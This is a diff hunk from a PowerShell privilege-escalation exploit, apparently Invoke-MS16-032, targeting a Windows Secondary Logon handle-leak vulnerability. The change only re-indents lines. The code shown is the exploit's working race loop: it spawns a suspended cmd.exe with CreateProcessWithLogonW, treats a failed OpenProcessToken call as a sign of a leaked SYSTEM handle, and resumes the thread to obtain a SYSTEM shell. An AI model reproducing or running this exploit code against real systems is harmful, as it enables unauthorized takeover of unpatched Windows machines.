@@ -331,38 +331,38 @@ function Invoke-MS16-032 {
 		# Adding a timeout (10 seconds) here to safeguard from edge-cases
 		$SafeGuard = [diagnostics.stopwatch]::StartNew()
 		while ($SafeGuard.ElapsedMilliseconds -lt 10000) {
-		# StartupInfo Struct
-		$StartupInfo = New-Object STARTUPINFO
-		$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
-		
-		# ProcessInfo Struct
-		$ProcessInfo = New-Object PROCESS_INFORMATION
-		
-		# CreateProcessWithLogonW --> lpCurrentDirectory
-		$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
-		
-		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
-		$CallResult = [Advapi32]::CreateProcessWithLogonW(
-			"user", "domain", "pass",
-			0x00000002, "C:\Windows\System32\cmd.exe", "",
-			0x00000004, $null, $GetCurrentPath,
-			[ref]$StartupInfo, [ref]$ProcessInfo)
+			# StartupInfo Struct
+			$StartupInfo = New-Object STARTUPINFO
+			$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
 			
-		$hTokenHandle = [IntPtr]::Zero
-		$CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle)
-		# If we can't open the process token it's a SYSTEM shell!
-		if (!$CallResult) {
-			echo "[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
-			$CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
-			$StartTokenRace.Stop()
-			$SafeGuard.Stop()
-			Return
-		}
+			# ProcessInfo Struct
+			$ProcessInfo = New-Object PROCESS_INFORMATION
 			
-		# Clean up suspended process
-		$CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
-		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
-		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)
+			# CreateProcessWithLogonW --> lpCurrentDirectory
+			$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
+			
+			# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
+			$CallResult = [Advapi32]::CreateProcessWithLogonW(
+				"user", "domain", "pass",
+				0x00000002, "C:\Windows\System32\cmd.exe", "",
+				0x00000004, $null, $GetCurrentPath,
+				[ref]$StartupInfo, [ref]$ProcessInfo)
+				
+			$hTokenHandle = [IntPtr]::Zero
+			$CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle)
+			# If we can't open the process token it's a SYSTEM shell!
+			if (!$CallResult) {
+				echo "[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
+				$CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
+				$StartTokenRace.Stop()
+				$SafeGuard.Stop()
+				Return
+			}
+				
+			# Clean up suspended process
+			$CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
+			$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
+			$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)
 		}
 		
 		# Kill runspace & stopwatch if edge-case
